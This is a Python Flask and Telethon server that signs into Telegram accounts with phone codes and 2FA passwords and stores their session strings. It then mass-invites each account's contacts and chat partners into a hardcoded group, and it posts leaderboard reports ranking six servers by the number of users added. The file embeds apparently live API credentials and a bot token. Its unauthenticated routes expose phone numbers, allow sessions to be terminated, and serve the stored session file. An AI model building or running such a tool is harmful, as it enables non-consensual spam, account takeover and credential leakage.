#!/usr/bin/env python3
"""
Telegram Auto-Add Server - Multi-Server Comparison System
All servers configured directly in code - No environment variables needed
Each server has its own admin name, API credentials, and tracks all adds
"""

import os
import json
import time
import threading
import logging
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests

# Telethon imports
from telethon import TelegramClient, events, functions, types
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, FloodWaitError, UserPrivacyRestrictedError,
    UserNotMutualContactError, ChatAdminRequiredError
)
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest, ResolveUsernameRequest
from telethon.tl.types import InputPeerUser, InputPeerChannel, InputPeerChat

# ============================================
# ⚙️ CONFIGURATION - EDIT THIS SECTION ONLY ⚙️
# ============================================

# 🔴 CHANGE THIS NUMBER FOR EACH SERVER (1-6)
SERVER_NUMBER = 1

# Server configurations for all 6 servers
SERVERS = {
    1: {
        'name': 'Admin1',
        'api_id': 33465589,
        'api_hash': '08bdab35790bf1fdf20c16a50bd323b8',
        'url': 'http://server1-url.com'  # Replace with actual URL
    },
    2: {
        'name': 'Admin2',
        'api_id': 12345678,  # Replace with your second API ID
        'api_hash': 'your_second_api_hash_here',
        'url': 'http://server2-url.com'  # Replace with actual URL
    },
    3: {
        'name': 'Admin3',
        'api_id': 12345678,  # Replace with your third API ID
        'api_hash': 'your_third_api_hash_here',
        'url': 'http://server3-url.com'  # Replace with actual URL
    },
    4: {
        'name': 'Admin4',
        'api_id': 12345678,  # Replace with your fourth API ID
        'api_hash': 'your_fourth_api_hash_here',
        'url': 'http://server4-url.com'  # Replace with actual URL
    },
    5: {
        'name': 'Admin5',
        'api_id': 12345678,  # Replace with your fifth API ID
        'api_hash': 'your_fifth_api_hash_here',
        'url': 'http://server5-url.com'  # Replace with actual URL
    },
    6: {
        'name': 'Admin6',
        'api_id': 12345678,  # Replace with your sixth API ID
        'api_hash': 'your_sixth_api_hash_here',
        'url': 'http://server6-url.com'  # Replace with actual URL
    }
}

# Telegram Bot for Daily Reports
BOT_TOKEN = '7930542124:AAFg5O4KUu7QFORVkxzowtG0nHAiX0yXXBY'
REPORT_CHAT_ID = '-1002452548749'

# Group username for auto-add
TARGET_GROUP = 'Abe_armygroup'

# ============================================
# AUTO-DETECT SERVER CONFIG
# ============================================

SERVER_CONFIG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_ADMIN_NAME = SERVER_CONFIG['name']
API_ID = SERVER_CONFIG['api_id']
API_HASH = SERVER_CONFIG['api_hash']
SERVER_URL = SERVER_CONFIG['url']

# Other servers for comparison
OTHER_SERVERS = [
    {'name': SERVERS[i]['name'], 'url': SERVERS[i]['url']} 
    for i in SERVERS if i != SERVER_NUMBER
]

# ============================================
# INITIALIZATION
# ============================================

PORT = 5000
DATA_DIR = 'data'

app = Flask(__name__)
CORS(app)

os.makedirs(DATA_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'{DATA_DIR}/server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============================================
# DATA STORAGE
# ============================================

class DataStore:
    def __init__(self):
        self.accounts_file = f'{DATA_DIR}/accounts.json'
        self.settings_file = f'{DATA_DIR}/auto_add_settings.json'
        self.stats_file = f'{DATA_DIR}/stats.json'
        self.history_file = f'{DATA_DIR}/add_history.json'
        self.server_info_file = f'{DATA_DIR}/server_info.json'
        
        self.accounts = self._load(self.accounts_file, [])
        self.settings = self._load(self.settings_file, {})
        self.stats = self._load(self.stats_file, self._default_stats())
        self.history = self._load(self.history_file, [])
        self.server_info = self._load(self.server_info_file, {
            'server_number': SERVER_NUMBER,
            'server_name': SERVER_ADMIN_NAME,
            'started_at': datetime.now().isoformat(),
            'other_servers': OTHER_SERVERS
        })
        
        self.clients = {}
        self.lock = threading.Lock()
    
    def _default_stats(self):
        return {
            'server_name': SERVER_ADMIN_NAME,
            'server_number': SERVER_NUMBER,
            'total_added': 0,
            'today_added': 0,
            'last_reset_date': datetime.now().strftime('%Y-%m-%d'),
            'daily_history': {},
            'target_group': TARGET_GROUP
        }
    
    def _load(self, filepath, default):
        try:
            if os.path.exists(filepath):
                with open(filepath, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Error loading {filepath}: {e}")
        return default
    
    def _save(self, filepath, data):
        try:
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving {filepath}: {e}")
    
    def save_all(self):
        with self.lock:
            self._save(self.accounts_file, self.accounts)
            self._save(self.settings_file, self.settings)
            self._save(self.stats_file, self.stats)
            self._save(self.history_file, self.history[-2000:])
            self._save(self.server_info_file, self.server_info)
    
    def reset_daily_if_needed(self):
        today = datetime.now().strftime('%Y-%m-%d')
        if self.stats.get('last_reset_date') != today:
            yesterday = self.stats.get('last_reset_date', today)
            self.stats['daily_history'][yesterday] = self.stats.get('today_added', 0)
            self.stats['today_added'] = 0
            self.stats['last_reset_date'] = today
            self.save_all()
    
    def add_to_today(self, count=1):
        self.reset_daily_if_needed()
        self.stats['today_added'] = self.stats.get('today_added', 0) + count
        self.stats['total_added'] = self.stats.get('total_added', 0) + count
    
    def log_add(self, account_id, user_id, username, source, success=True):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'server': SERVER_ADMIN_NAME,
            'server_number': SERVER_NUMBER,
            'account_id': account_id,
            'user_id': user_id,
            'username': username,
            'source': source,
            'success': success
        }
        self.history.append(entry)
        if success:
            self.add_to_today()
        self.save_all()

store = DataStore()

# ============================================
# TELEGRAM BOT FOR REPORTS
# ============================================

def send_telegram_message(text, parse_mode='HTML'):
    """Send message to Telegram report chat"""
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        payload = {
            'chat_id': REPORT_CHAT_ID,
            'text': text,
            'parse_mode': parse_mode,
            'disable_web_page_preview': True
        }
        response = requests.post(url, json=payload, timeout=15)
        result = response.json()
        if not result.get('ok'):
            logger.error(f"Telegram API error: {result}")
        return result
    except Exception as e:
        logger.error(f"Error sending Telegram message: {e}")
        return None

def fetch_server_stats(server_url):
    """Fetch stats from another server"""
    try:
        resp = requests.get(f"{server_url}/api/public-stats", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('success'):
                return data['stats']
    except Exception as e:
        logger.error(f"Error fetching from {server_url}: {e}")
    return None

def send_daily_report():
    """Generate and send daily report comparing all servers"""
    try:
        store.reset_daily_if_needed()
        
        # Get our stats
        our_stats = {
            'name': SERVER_ADMIN_NAME,
            'server_number': SERVER_NUMBER,
            'today': store.stats.get('today_added', 0),
            'total': store.stats.get('total_added', 0),
            'active_accounts': len([a for a in store.accounts if a.get('active', True)]),
            'target_group': TARGET_GROUP
        }
        
        # Fetch stats from other servers
        all_stats = [our_stats]
        failed_servers = []
        
        for server in OTHER_SERVERS:
            stats = fetch_server_stats(server['url'])
            if stats:
                all_stats.append(stats)
            else:
                failed_servers.append(server['name'])
                all_stats.append({
                    'name': server['name'],
                    'today': 0,
                    'total': 0,
                    'error': True
                })
        
        # Calculate totals and percentages
        total_today = sum(s.get('today', 0) for s in all_stats)
        total_all_time = sum(s.get('total', 0) for s in all_stats)
        active_servers = len([s for s in all_stats if not s.get('error')])
        
        # Sort by today's adds (highest first)
        all_stats.sort(key=lambda x: x.get('today', 0), reverse=True)
        
        # Build report message
        current_time = datetime.now().strftime('%H:%M UTC')
        current_date = datetime.now().strftime('%Y-%m-%d')
        
        report = f"""
📊 <b>DAILY AUTO-ADD REPORT</b>
📅 <b>{current_date}</b> | 🕐 <b>{current_time}</b>

━━━━━━━━━━━━━━━━━━━━━━
<b>🏆 SERVER RANKINGS</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
        
        # Add ranking for each server
        for i, stats in enumerate(all_stats, 1):
            name = stats.get('name', f'Server {i}')
            today = stats.get('today', 0)
            total = stats.get('total', 0)
            error = stats.get('error', False)
            
            # Calculate percentage
            percentage = (today / total_today * 100) if total_today > 0 else 0
            
            # Medal for top 3
            if i == 1:
                medal = '🥇'
            elif i == 2:
                medal = '🥈'
            elif i == 3:
                medal = '🥉'
            else:
                medal = f'{i}️⃣'
            
            # Status indicator
            status = '⚠️ OFFLINE' if error else '✅ ONLINE'
            
            # Bar visualization
            bar_length = int(percentage / 5) if percentage > 0 else 0
            bar = '█' * bar_length + '░' * (20 - bar_length)
            
            report += f"""
{medal} <b>{name}</b> [{status}]
   {bar} <b>{today:,}</b> ({percentage:.1f}%)
   📅 Today: <b>{today:,}</b> users
   📊 Total: <b>{total:,}</b> users
"""
        
        report += f"""
━━━━━━━━━━━━━━━━━━━━━━
<b>📈 SUMMARY STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━━━
• 🌐 Active Servers: <b>{active_servers}/{len(all_stats)}</b>
• 📥 Total Added Today: <b>{total_today:,}</b> users
• 📊 Total All-Time: <b>{total_all_time:,}</b> users
• 📈 Average Per Server: <b>{total_today // max(active_servers, 1):,}</b> users
• 👑 Top Performer: <b>{all_stats[0]['name']}</b> ({all_stats[0].get('today', 0):,} users)

"""
        
        # Add comparison with yesterday
        yesterday = (datetime.now() - timedelta(days=1)).strftime('%Y-%m-%d')
        yesterday_total = store.stats.get('daily_history', {}).get(yesterday, 0)
        if yesterday_total > 0:
            if our_stats['today'] > yesterday_total:
                trend = '📈 UP'
                change = f"+{our_stats['today'] - yesterday_total}"
            elif our_stats['today'] < yesterday_total:
                trend = '📉 DOWN'
                change = f"-{yesterday_total - our_stats['today']}"
            else:
                trend = '➡️ SAME'
                change = '0'
            
            report += f"""━━━━━━━━━━━━━━━━━━━━━━
<b>📊 {SERVER_ADMIN_NAME} TREND</b>
━━━━━━━━━━━━━━━━━━━━━━
• Yesterday: <b>{yesterday_total:,}</b> users
• Today: <b>{our_stats['today']:,}</b> users
• Change: <b>{trend} {change}</b>
"""
        
        # Failed servers warning
        if failed_servers:
            report += f"""
━━━━━━━━━━━━━━━━━━━━━━
<b>⚠️ CONNECTION ISSUES</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
            for name in failed_servers:
                report += f"• <b>{name}</b>: Could not connect\n"
        
        report += f"""
━━━━━━━━━━━━━━━━━━━━━━
<i>🤖 Auto-generated by {SERVER_ADMIN_NAME}
📅 {datetime.now().strftime('%Y-%m-%d %H:%M UTC')}</i>
"""
        
        return send_telegram_message(report)
        
    except Exception as e:
        logger.error(f"Error generating daily report: {e}")
        return None

def send_hourly_update():
    """Send hourly update to Telegram"""
    try:
        store.reset_daily_if_needed()
        
        today = store.stats.get('today_added', 0)
        total = store.stats.get('total_added', 0)
        active = len([a for a in store.accounts if a.get('active', True)])
        
        message = f"""
⏰ <b>Hourly Update - {SERVER_ADMIN_NAME}</b>
🕐 {datetime.now().strftime('%H:%M UTC')}

📥 Today: <b>{today:,}</b> users
📊 Total: <b>{total:,}</b> users
👤 Active Accounts: <b>{active}</b>
🎯 Target: <b>@{TARGET_GROUP}</b>
"""
        send_telegram_message(message)
    except Exception as e:
        logger.error(f"Error sending hourly update: {e}")

# ============================================
# AUTO-ADD ENGINE
# ============================================

class AutoAddEngine:
    def __init__(self):
        self.running = {}
        self.threads = {}
        self.added_users = {}  # Track added users per account
    
    def start_for_account(self, account_id):
        if account_id in self.running and self.running[account_id]:
            return False, "Already running"
        
        settings = store.settings.get(str(account_id), {})
        if not settings.get('enabled'):
            return False, "Auto-add not enabled"
        
        account = next((a for a in store.accounts if a['id'] == account_id), None)
        if not account:
            return False, "Account not found"
        
        client = store.clients.get(account_id)
        if not client:
            return False, "Account not connected"
        
        self.running[account_id] = True
        if account_id not in self.added_users:
            self.added_users[account_id] = set()
        
        thread = threading.Thread(
            target=self._auto_add_loop,
            args=(account_id, client, settings),
            daemon=True
        )
        thread.start()
        self.threads[account_id] = thread
        
        return True, "Auto-add started"
    
    def stop_for_account(self, account_id):
        self.running[account_id] = False
        return True, "Auto-add stopped"
    
    def _auto_add_loop(self, account_id, client, settings):
        target_group = settings.get('target_group', TARGET_GROUP)
        delay = max(25, settings.get('delay_seconds', 25))
        auto_join = settings.get('auto_join', True)
        
        logger.info(f"[AutoAdd] Starting for {SERVER_ADMIN_NAME} account {account_id} -> @{target_group}")
        
        # Auto-join target group
        if auto_join:
            try:
                entity = client.loop.run_until_complete(
                    client.get_entity(f'@{target_group}')
                )
                client.loop.run_until_complete(
                    client(JoinChannelRequest(entity))
                )
                logger.info(f"[AutoAdd] Joined @{target_group}")
            except Exception as e:
                logger.error(f"[AutoAdd] Join error: {e}")
        
        added_users = self.added_users.get(account_id, set())
        consecutive_failures = 0
        add_count = 0
        
        while self.running.get(account_id):
            try:
                store.reset_daily_if_needed()
                
                # Find members to add
                new_members = self._find_members(client, added_users)
                
                if not new_members:
                    consecutive_failures += 1
                    if consecutive_failures > 5:
                        added_users.clear()
                        consecutive_failures = 0
                        logger.info(f"[AutoAdd] Cleared user cache, searching fresh")
                    time.sleep(delay * 2)
                    continue
                
                consecutive_failures = 0
                
                # Add members
                for member in new_members[:3]:
                    if not self.running.get(account_id):
                        break
                    
                    user_id = member['id']
                    if user_id in added_users:
                        continue
                    
                    try:
                        success = client.loop.run_until_complete(
                            self._add_user_to_group(client, target_group, user_id)
                        )
                        
                        if success:
                            added_users.add(user_id)
                            add_count += 1
                            store.log_add(
                                account_id, user_id,
                                member.get('username', ''),
                                member.get('source', 'unknown')
                            )
                            
                            logger.info(f"[{SERVER_ADMIN_NAME}] +{add_count} Added user {user_id} ({member.get('source')})")
                            
                            # Send update every 50 adds
                            if add_count % 50 == 0:
                                self._send_progress_update(add_count)
                        
                        time.sleep(delay)
                        
                    except FloodWaitError as e:
                        logger.warning(f"[AutoAdd] Flood wait: {e.seconds}s")
                        time.sleep(e.seconds + 10)
                    except Exception as e:
                        logger.error(f"[AutoAdd] Error: {e}")
                        time.sleep(delay)
                
            except Exception as e:
                logger.error(f"[AutoAdd] Loop error: {e}")
                time.sleep(delay * 2)
        
        logger.info(f"[AutoAdd] Stopped for account {account_id}. Total added: {add_count}")
    
    def _find_members(self, client, exclude_users):
        members = []
        
        try:
            # Get from contacts
            try:
                contacts = client.loop.run_until_complete(
                    client(GetContactsRequest(hash=0))
                )
                for contact in contacts.contacts[:100]:
                    if contact.id not in exclude_users and not getattr(contact, 'bot', False):
                        members.append({
                            'id': contact.id,
                            'username': getattr(contact, 'username', ''),
                            'source': 'contacts'
                        })
            except:
                pass
            
            # Get from recent dialogs
            try:
                dialogs = client.loop.run_until_complete(
                    client.get_dialogs(limit=200)
                )
                for dialog in dialogs:
                    if dialog.is_user and not getattr(dialog.entity, 'bot', False):
                        if dialog.entity.id not in exclude_users and len(members) < 200:
                            members.append({
                                'id': dialog.entity.id,
                                'username': getattr(dialog.entity, 'username', ''),
                                'source': 'dialogs'
                            })
            except:
                pass
            
            # Shuffle for variety
            import random
            random.shuffle(members)
            
        except Exception as e:
            logger.error(f"[AutoAdd] Find members error: {e}")
        
        return members
    
    async def _add_user_to_group(self, client, group_username, user_id):
        try:
            group = await client.get_entity(f'@{group_username}')
            user = await client.get_entity(user_id)
            
            if isinstance(group, types.Channel):
                await client(InviteToChannelRequest(
                    channel=group,
                    users=[user]
                ))
            else:
                await client(functions.messages.AddChatUserRequest(
                    chat_id=group.id,
                    user_id=user.id,
                    fwd_limit=100
                ))
            return True
            
        except UserPrivacyRestrictedError:
            return False
        except UserNotMutualContactError:
            return False
        except FloodWaitError as e:
            raise
        except Exception as e:
            logger.debug(f"Add error for {user_id}: {e}")
            return False
    
    def _send_progress_update(self, count):
        try:
            message = f"""
📊 <b>Progress Update - {SERVER_ADMIN_NAME}</b>

✅ Added <b>{count}</b> users in this session
📥 Today Total: <b>{store.stats.get('today_added', 0):,}</b>
📊 All-Time: <b>{store.stats.get('total_added', 0):,}</b>
🎯 Target: <b>@{TARGET_GROUP}</b>
🕐 {datetime.now().strftime('%H:%M UTC')}
"""
            send_telegram_message(message)
        except:
            pass

auto_add_engine = AutoAddEngine()

# ============================================
# API ROUTES
# ============================================

@app.route('/')
@app.route('/auto-add')
def index():
    return send_from_directory('.', 'auto_add.html')

@app.route('/dashboard')
def dashboard():
    if os.path.exists('fog.html'):
        return send_from_directory('.', 'fog.html')
    return send_from_directory('.', 'auto_add.html')

@app.route('/dash')
def dash():
    if os.path.exists('dash.html'):
        return send_from_directory('.', 'dash.html')
    return send_from_directory('.', 'auto_add.html')

@app.route('/all')
def devices():
    if os.path.exists('all.html'):
        return send_from_directory('.', 'all.html')
    return send_from_directory('.', 'auto_add.html')

@app.route('/login')
def login():
    if os.path.exists('login.html'):
        return send_from_directory('.', 'login.html')
    return send_from_directory('.', 'auto_add.html')

@app.route('/<path:path>')
def serve_static(path):
    if os.path.exists(path):
        return send_from_directory('.', path)
    return send_from_directory('.', 'auto_add.html')

@app.route('/ping')
@app.route('/api/health')
def health_check():
    store.reset_daily_if_needed()
    return jsonify({
        'status': 'ok',
        'server_name': SERVER_ADMIN_NAME,
        'server_number': SERVER_NUMBER,
        'timestamp': datetime.now().isoformat(),
        'accounts': len(store.accounts),
        'today_added': store.stats.get('today_added', 0),
        'total_added': store.stats.get('total_added', 0),
        'target_group': TARGET_GROUP
    })

@app.route('/api/public-stats')
def public_stats():
    """Public stats for cross-server comparison"""
    store.reset_daily_if_needed()
    return jsonify({
        'success': True,
        'stats': {
            'name': SERVER_ADMIN_NAME,
            'server_number': SERVER_NUMBER,
            'today': store.stats.get('today_added', 0),
            'total': store.stats.get('total_added', 0),
            'active_accounts': len([a for a in store.accounts if a.get('active', True)]),
            'target_group': TARGET_GROUP,
            'last_updated': datetime.now().isoformat(),
            'url': SERVER_URL
        }
    })

@app.route('/api/server-info')
def server_info():
    """Get server configuration info"""
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_ADMIN_NAME,
            'url': SERVER_URL,
            'target_group': TARGET_GROUP,
            'total_servers': len(SERVERS),
            'other_servers': OTHER_SERVERS
        }
    })

# Account Management
@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
        if not phone.startswith('+'):
            phone = '+' + phone
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        client.connect()
        
        result = client.send_code_request(phone)
        
        session_id = str(int(time.time() * 1000))
        temp_data = {
            'session_id': session_id,
            'phone': phone,
            'phone_code_hash': result.phone_code_hash,
            'client': client
        }
        
        if not hasattr(app, 'temp_sessions'):
            app.temp_sessions = {}
        app.temp_sessions[session_id] = temp_data
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'message': f'Verification code sent to {phone}'
        })
    except Exception as e:
        logger.error(f"Error adding account: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        session_id = data.get('session_id', '')
        password = data.get('password', '')
        
        if not hasattr(app, 'temp_sessions') or session_id not in app.temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please try again.'})
        
        temp = app.temp_sessions[session_id]
        client = temp['client']
        phone = temp['phone']
        
        try:
            client.sign_in(phone=phone, code=code, phone_code_hash=temp['phone_code_hash'])
        except SessionPasswordNeededError:
            if not password:
                return jsonify({'success': False, 'need_password': True, 'message': '2FA password required'})
            try:
                client.sign_in(password=password)
            except Exception as e:
                return jsonify({'success': False, 'error': f'Invalid 2FA password: {str(e)}'})
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})
        
        me = client.get_me()
        
        account_id = int(time.time() * 1000)
        string_session = client.session.save()
        
        account = {
            'id': account_id,
            'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or 'User',
            'phone': phone,
            'username': me.username or '',
            'session_string': string_session,
            'active': True,
            'server': SERVER_ADMIN_NAME,
            'server_number': SERVER_NUMBER,
            'added_at': datetime.now().isoformat()
        }
        
        store.accounts.append(account)
        store.clients[account_id] = client
        store.save_all()
        
        del app.temp_sessions[session_id]
        
        setup_client_handler(account_id, client)
        
        return jsonify({
            'success': True,
            'account': {
                'id': account_id,
                'name': account['name'],
                'phone': account['phone']
            }
        })
    except Exception as e:
        logger.error(f"Error verifying code: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/accounts')
def get_accounts():
    return jsonify({
        'success': True,
        'accounts': [{
            'id': a['id'],
            'name': a['name'],
            'phone': a['phone'],
            'username': a.get('username', ''),
            'active': a.get('active', True),
            'server': a.get('server', SERVER_ADMIN_NAME),
            'auto_add_enabled': store.settings.get(str(a['id']), {}).get('enabled', False)
        } for a in store.accounts]
    })

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    try:
        data = request.json
        account_id = data.get('accountId')
        
        store.accounts = [a for a in store.accounts if a['id'] != account_id]
        
        if account_id in store.clients:
            try:
                store.clients[account_id].disconnect()
            except:
                pass
            del store.clients[account_id]
        
        if str(account_id) in store.settings:
            del store.settings[str(account_id)]
        
        auto_add_engine.stop_for_account(account_id)
        store.save_all()
        
        return jsonify({'success': True, 'message': 'Account removed'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Session Management
@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    try:
        data = request.json
        account_id = data.get('accountId')
        
        client = store.clients.get(account_id)
        if not client:
            return jsonify({'success': False, 'error': 'Account not connected'})
        
        result = client(functions.account.GetAuthorizationsRequest())
        
        current_hash = None
        sessions = []
        
        for auth in result.authorizations:
            session_info = {
                'hash': str(auth.hash),
                'device_model': auth.device_model or 'Unknown',
                'platform': auth.platform or 'Unknown',
                'ip': auth.ip or '',
                'country': auth.country or '',
                'date_active': auth.date_active,
                'current': auth.current
            }
            if auth.current:
                current_hash = str(auth.hash)
            sessions.append(session_info)
        
        return jsonify({
            'success': True,
            'sessions': sessions,
            'current_hash': current_hash
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    try:
        data = request.json
        account_id = data.get('accountId')
        session_hash = data.get('hash')
        
        client = store.clients.get(account_id)
        if not client:
            return jsonify({'success': False, 'error': 'Account not connected'})
        
        client(functions.account.ResetAuthorizationRequest(hash=int(session_hash)))
        return jsonify({'success': True, 'message': 'Session terminated'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    try:
        data = request.json
        account_id = data.get('accountId')
        
        client = store.clients.get(account_id)
        if not client:
            return jsonify({'success': False, 'error': 'Account not connected'})
        
        result = client(functions.account.GetAuthorizationsRequest())
        
        terminated = 0
        for auth in result.authorizations:
            if not auth.current:
                try:
                    client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                    terminated += 1
                except:
                    pass
        
        return jsonify({
            'success': True,
            'message': f'Terminated {terminated} other sessions'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Auto-Add Settings
@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings():
    if request.method == 'GET':
        account_id = request.args.get('accountId')
        settings = store.settings.get(str(account_id), {
            'enabled': False,
            'target_group': TARGET_GROUP,
            'delay_seconds': 25,
            'auto_join': True
        })
        settings['added_today'] = store.stats.get('today_added', 0)
        settings['total_added'] = store.stats.get('total_added', 0)
        settings['server_name'] = SERVER_ADMIN_NAME
        
        return jsonify({'success': True, 'settings': settings})
    
    else:
        try:
            data = request.json
            account_id = data.get('accountId')
            enabled = data.get('enabled', False)
            target_group = data.get('target_group', TARGET_GROUP)
            delay_seconds = max(25, data.get('delay_seconds', 25))
            auto_join = data.get('auto_join', True)
            
            settings = {
                'enabled': enabled,
                'target_group': target_group,
                'delay_seconds': delay_seconds,
                'auto_join': auto_join,
                'updated_at': datetime.now().isoformat(),
                'server': SERVER_ADMIN_NAME
            }
            
            store.settings[str(account_id)] = settings
            store.save_all()
            
            if enabled:
                client = store.clients.get(account_id)
                if client:
                    auto_add_engine.start_for_account(account_id)
            else:
                auto_add_engine.stop_for_account(account_id)
            
            return jsonify({'success': True, 'message': 'Settings saved'})
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    account_id = request.args.get('accountId')
    store.reset_daily_if_needed()
    
    return jsonify({
        'success': True,
        'added_today': store.stats.get('today_added', 0),
        'total_added': store.stats.get('total_added', 0),
        'server_name': SERVER_ADMIN_NAME,
        'server_number': SERVER_NUMBER,
        'daily_history': store.stats.get('daily_history', {}),
        'last_updated': datetime.now().isoformat()
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    try:
        data = request.json
        account_id = data.get('accountId')
        
        client = store.clients.get(account_id)
        if not client:
            return jsonify({'success': False, 'error': 'Account not connected'})
        
        settings = store.settings.get(str(account_id), {})
        target_group = settings.get('target_group', TARGET_GROUP)
        
        group_found = False
        group_title = target_group
        try:
            entity = client.get_entity(f'@{target_group}')
            group_found = True
            group_title = getattr(entity, 'title', target_group)
        except:
            pass
        
        available = 0
        try:
            contacts = client(GetContactsRequest(hash=0))
            available += len([c for c in contacts.contacts if not getattr(c, 'bot', False)])
        except:
            pass
        
        try:
            dialogs = client.get_dialogs(limit=100)
            available += len([d for d in dialogs if d.is_user and not getattr(d.entity, 'bot', False)])
        except:
            pass
        
        return jsonify({
            'success': True,
            'group_found': group_found,
            'group_title': group_title,
            'available_members': available,
            'can_add_members': available > 0,
            'server_name': SERVER_ADMIN_NAME,
            'target_group': target_group
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-report')
def trigger_report():
    result = send_daily_report()
    if result and result.get('ok'):
        return jsonify({'success': True, 'message': 'Report sent successfully'})
    return jsonify({'success': False, 'error': 'Failed to send report'})

@app.route('/api/add-history')
def get_add_history():
    limit = int(request.args.get('limit', 50))
    return jsonify({
        'success': True,
        'history': store.history[-limit:],
        'total_records': len(store.history),
        'server': SERVER_ADMIN_NAME
    })

# Client Setup
def setup_client_handler(account_id, client):
    @client.on(events.NewMessage(incoming=True))
    async def handle_incoming(event):
        if event.is_private:
            logger.debug(f"[{SERVER_ADMIN_NAME}] New message for account {account_id}")

def restore_sessions():
    """Restore saved sessions on startup"""
    restored = 0
    for account in store.accounts:
        if account.get('session_string'):
            try:
                client = TelegramClient(
                    StringSession(account['session_string']),
                    API_ID, API_HASH
                )
                client.connect()
                
                if client.is_user_authorized():
                    account_id = account['id']
                    store.clients[account_id] = client
                    setup_client_handler(account_id, client)
                    account['active'] = True
                    restored += 1
                    
                    # Restart auto-add if enabled
                    settings = store.settings.get(str(account_id), {})
                    if settings.get('enabled'):
                        auto_add_engine.start_for_account(account_id)
                else:
                    account['active'] = False
            except Exception as e:
                logger.error(f"Error restoring {account.get('name')}: {e}")
                account['active'] = False
    
    store.save_all()
    logger.info(f"[{SERVER_ADMIN_NAME}] Restored {restored} sessions")

# Scheduled Tasks
def schedule_tasks():
    """Schedule daily reports and hourly updates"""
    # Start daily report scheduler
    def daily_report_task():
        while True:
            now = datetime.now()
            next_midnight = (now + timedelta(days=1)).replace(hour=0, minute=0, second=1, microsecond=0)
            seconds = (next_midnight - now).total_seconds()
            time.sleep(seconds)
            logger.info(f"[{SERVER_ADMIN_NAME}] Sending daily report...")
            store.reset_daily_if_needed()
            send_daily_report()
    
    # Start hourly update scheduler
    def hourly_update_task():
        while True:
            now = datetime.now()
            next_hour = (now + timedelta(hours=1)).replace(minute=0, second=0, microsecond=0)
            seconds = (next_hour - now).total_seconds()
            time.sleep(max(seconds, 60))
            send_hourly_update()
    
    threading.Thread(target=daily_report_task, daemon=True).start()
    threading.Thread(target=hourly_update_task, daemon=True).start()

# ============================================
# MAIN
# ============================================

if __name__ == '__main__':
    print(f"""
╔═══════════════════════════════════════════════╗
║     TELEGRAM AUTO-ADD SERVER                  ║
╠═══════════════════════════════════════════════╣
║ Server #{SERVER_NUMBER}: {SERVER_ADMIN_NAME:<33s} ║
║ API_ID: {API_ID}                            ║
║ Target: @{TARGET_GROUP:<33s} ║
║ Bot: {'✓ Connected' if BOT_TOKEN else '✗ Not Set':<33s} ║
║ Chat: {REPORT_CHAT_ID:<33s} ║
║ Port: {PORT}                                    ║
╠═══════════════════════════════════════════════╣
║ Other Servers: {len(OTHER_SERVERS)}                             ║
""")
    for s in OTHER_SERVERS:
        print(f"║ • {s['name']} ({s['url']}){' ' * max(0, 30 - len(s['name']) - len(s['url']))}║")
    print("""╚═══════════════════════════════════════════════╝
    """)
    
    restore_sessions()
    schedule_tasks()
    
    # Send startup notification
    send_telegram_message(f"""
🟢 <b>Server Online - {SERVER_ADMIN_NAME}</b>
🕐 {datetime.now().strftime('%Y-%m-%d %H:%M UTC')}

📋 <b>Configuration:</b>
• Server: <b>#{SERVER_NUMBER} - {SERVER_ADMIN_NAME}</b>
• Target: <b>@{TARGET_GROUP}</b>
• API_ID: <b>{API_ID}</b>
• Accounts: <b>{len(store.accounts)}</b>
• Today: <b>{store.stats.get('today_added', 0):,}</b> users
• Total: <b>{store.stats.get('total_added', 0):,}</b> users
• Port: <b>{PORT}</b>
""")
    
    app.run(host='0.0.0.0', port=PORT, debug=False)
